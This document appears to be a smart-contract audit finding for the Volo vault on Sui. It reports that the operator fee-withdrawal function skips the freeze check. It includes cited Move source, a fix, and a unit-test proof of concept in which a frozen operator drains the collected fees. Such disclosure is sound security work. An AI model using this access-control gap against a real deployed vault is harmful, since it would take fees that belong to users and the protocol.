# Audit Report

## Title
Frozen Operator Capabilities Retain Fee Withdrawal Access

## Summary
The `vault_manage::retrieve_deposit_withdraw_fee_operator()` function fails to validate operator freeze status, allowing frozen operators to continue withdrawing accumulated deposit/withdraw fees despite the administrative freeze action intended to revoke all operator privileges.

## Finding Description
The Volo vault implements an operator freeze mechanism to revoke operator privileges during security incidents. The freeze status is tracked in `Operation.freezed_operators` and enforced via `vault::assert_operator_not_freezed()`. [1](#0-0) 

All operator functions in `operation.move` consistently enforce this check by taking an `Operation` parameter and calling the freeze validation. [2](#0-1) 

Similarly, all operator functions in `reward_manager.move` properly validate freeze status. [3](#0-2) 

However, `vault_manage::retrieve_deposit_withdraw_fee_operator()` breaks this security pattern. The function signature only requires `OperatorCap` ownership without taking an `Operation` parameter, making it structurally impossible to check freeze status. [4](#0-3) 

The function delegates directly to the package-level `vault::retrieve_deposit_withdraw_fee()` which performs no freeze validation, only checking vault version and status. [5](#0-4) 

The freeze validation function requires both `Operation` and `OperatorCap` references to check the `freezed_operators` table. [6](#0-5) 

Test infrastructure confirms that frozen operators are blocked from vault operations with `ERR_OPERATOR_FREEZED`. [7](#0-6) 

## Impact Explanation
A frozen operator retains the ability to drain all accumulated deposit and withdraw fees from `vault.deposit_withdraw_fee_collected` even after the admin has frozen their access due to malicious behavior or key compromise. This directly violates the access control invariant that frozen operators should have zero privileges. Fees represent real economic value extracted from users during deposits/withdrawals, and unauthorized extraction constitutes fund theft. The two-tier permission system creates operational confusion about which privileges are actually revoked by freezing.

## Likelihood Explanation
The exploit path is straightforward and requires no special conditions:

1. Admin creates OperatorCap via `create_operator_cap()` [8](#0-7) 
2. Admin freezes operator via `set_operator_freezed()` due to security concerns [9](#0-8) 
3. Frozen operator calls the public function `retrieve_deposit_withdraw_fee_operator()` successfully

The function is declared as `public fun` making it directly callable in transactions. Test cases demonstrate both freeze functionality and fee retrieval work in normal transaction flows, confirming the vulnerability is exploitable under standard conditions.

## Recommendation
Modify `retrieve_deposit_withdraw_fee_operator()` to take an `Operation` parameter and validate freeze status before fee withdrawal:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    operation: &Operation,  // Add Operation parameter
    cap: &OperatorCap,      // Change from _ to cap
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);  // Add freeze check
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

This aligns the function with the security pattern used consistently throughout `operation.move` and `reward_manager.move`.

## Proof of Concept

```move
#[test]
// [TEST-CASE: Frozen operator can still retrieve fees] @test-case VULN-FREEZE-FEE
public fun test_frozen_operator_retrieves_fee() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Setup vault and create operator
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);
    
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        vault_manage::set_deposit_fee(&admin_cap, &mut vault, 100);
        let operator_cap = vault_manage::create_operator_cap(&admin_cap, s.ctx());
        transfer::public_transfer(operator_cap, OWNER);
        test_scenario::return_shared(vault);
        s.return_to_sender(admin_cap);
    };
    
    // Execute deposit to collect fees
    s.next_tx(OWNER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        let (_request_id, receipt, coin) = user_entry::deposit(
            &mut vault, &mut reward_manager, coin, 1_000_000_000, 
            990_000_000, option::none(), &clock, s.ctx()
        );
        transfer::public_transfer(coin, OWNER);
        transfer::public_transfer(receipt, OWNER);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };
    
    // Freeze the operator
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        vault_manage::set_operator_freezed(
            &admin_cap, &mut operation, operator_cap.operator_id(), true
        );
        assert!(vault::operator_freezed(&operation, operator_cap.operator_id()));
        test_scenario::return_shared(operation);
        s.return_to_sender(operator_cap);
        s.return_to_sender(admin_cap);
    };
    
    // VULNERABILITY: Frozen operator can still retrieve fees
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let fee_before = vault.deposit_withdraw_fee_collected();
        
        // This should FAIL but succeeds - frozen operator withdraws fees
        let fee_balance = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap, &mut vault, fee_before
        );
        
        assert!(fee_balance.value() == fee_before); // Proves fee extraction succeeded
        assert!(vault.deposit_withdraw_fee_collected() == 0); // Fees drained
        
        fee_balance.destroy_for_testing();
        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

**Notes:**
- This vulnerability affects only the fee withdrawal function for operators; all other operator operations correctly enforce freeze validation
- The root cause is the missing `Operation` parameter in the function signature, making freeze checks structurally impossible without breaking changes to the public API
- Historical OperatorCaps created before freezing was implemented may not be tracked in `freezed_operators`, but any operator explicitly frozen via `set_operator_freezed()` should have all privileges revoked

### Citations

**File:** volo-vault/sources/volo_vault.move (L362-378)
```text
public(package) fun set_operator_freezed(
    operation: &mut Operation,
    op_cap_id: address,
    freezed: bool,
) {
    if (operation.freezed_operators.contains(op_cap_id)) {
        let v = operation.freezed_operators.borrow_mut(op_cap_id);
        *v = freezed;
    } else {
        operation.freezed_operators.add(op_cap_id, freezed);
    };

    emit(OperatorFreezed {
        operator_id: op_cap_id,
        freezed: freezed,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L380-385)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
}
```

**File:** volo-vault/sources/volo_vault.move (L1544-1557)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
}
```

**File:** volo-vault/sources/operation.move (L100-106)
```text
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
    pre_vault_check(vault, ctx);
```

**File:** volo-vault/sources/reward_manager.move (L235-241)
```text
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    with_buffer: bool, // If true, create a new reward buffer distribution for the reward type
) {
    self.check_version();
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/manage.move (L84-86)
```text
public fun create_operator_cap(_: &AdminCap, ctx: &mut TxContext): OperatorCap {
    vault::create_operator_cap(ctx)
}
```

**File:** volo-vault/sources/manage.move (L88-95)
```text
public fun set_operator_freezed(
    _: &AdminCap,
    operation: &mut Operation,
    op_cap_id: address,
    freezed: bool,
) {
    vault::set_operator_freezed(operation, op_cap_id, freezed);
}
```

**File:** volo-vault/sources/manage.move (L150-156)
```text
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/tests/operation/operation.test.move (L1561-1563)
```text
#[test]
#[expected_failure(abort_code = vault::ERR_OPERATOR_FREEZED, location = vault)]
// [TEST-CASE: Should do op fail if operator is freezed.] @test-case OPERATION-012
```
